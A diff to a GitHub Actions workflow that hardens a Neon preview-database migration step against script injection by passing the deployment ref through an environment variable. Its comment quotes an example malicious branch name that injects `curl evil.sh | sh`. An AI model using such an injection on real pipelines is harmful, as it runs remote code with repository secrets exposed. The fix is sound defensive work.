@@ -257,11 +257,16 @@ jobs:
       # adjust the pattern below if yours differs.
       - name: Migrate the preview database branch
         run: |
-          DATABASE_URL=$(npx neonctl connection-string "preview/${{ github.event.deployment.ref }}" \
+          DATABASE_URL=$(npx neonctl connection-string "preview/$DEPLOY_REF" \
             --project-id "$NEON_PROJECT_ID")
           export DATABASE_URL
           pnpm drizzle-kit migrate
         env:
+          # DEPLOY_REF is a branch name, and branch names can contain quotes and
+          # semicolons. Bound here rather than written inline, because GitHub
+          # expands ${{ }} textually before bash parses the script — inline, a
+          # branch named `x"; curl evil.sh | sh; echo "` runs with these secrets.
+          DEPLOY_REF: ${{ github.event.deployment.ref }}
           NEON_API_KEY: ${{ secrets.NEON_API_KEY }}
           NEON_PROJECT_ID: ${{ vars.NEON_PROJECT_ID }}
 
